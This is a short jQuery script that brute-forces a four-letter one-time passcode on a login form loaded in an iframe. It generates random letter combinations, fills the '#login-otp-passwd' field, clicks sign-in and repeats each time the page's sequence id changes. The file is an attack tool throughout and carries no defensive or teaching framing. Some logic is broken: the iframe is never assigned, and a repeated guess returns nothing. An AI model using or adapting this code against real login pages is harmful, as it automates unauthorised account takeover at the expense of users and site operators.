$(document).on('ready', function(){
	var alphabet = ['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'],
		indexMods = [0,0,0,0],
		comboLength = alphabet.length,
		count=0,
		possibleOutcomes = Math.pow(comboLength, 4); // 456976
	var firstIndex = secondIndex = thirdIndex = fourthIndex = 0;
	var timer;
	var previousAttempts = {};
	var iframe = null;
	$('#zeframe').on('load', function(){
		// iframe = $('#zeframe').contents();
		console.log(iframe);
	});

	// bruteforce();
	function bruteforce(){
		var storedAttempt = selectFromFrame('[name="_seqid"]').first().attr('value');
		attack();
		timer = setInterval(function(){
			var checkAttempt = selectFromFrame('[name="_seqid"]').first().attr('value');
			if(storedAttempt != checkAttempt){
				storedAttempt = checkAttempt;
				attack();
			}
		}, 1);
	}

	function attack(){
		var passInput = selectFromFrame('#login-otp-passwd');
		console.time('genPass');
		var passGen = getNewCombo();
		console.timeEnd('genPass');
		passInput.val(passGen);
		count++;
		console.log('Bruteforce attempt: '+count);
		selectFromFrame('#login-otp-signin').click();
	}

	function q(){
		clearInterval(timer);
	}

	function selectFromFrame(queryString){
		return iframe.find(queryString);
	}

	function getNewCombo(){
		for(var i=0; i<indexMods.length; i++){
			indexMods[i] = Math.floor(Math.random()*26);
		}
		var trial = createString();
		if(previousAttempts[trial] !== true){
			previousAttempts[trial] = true;
			return trial;
		} else{
			getNewCombo();
		}
	}
	function createString(){
		var finalString = '';
		for(var i=0; i<indexMods.length; i++){
			finalString += alphabet[indexMods[i]];
		}
		return finalString;
	}
});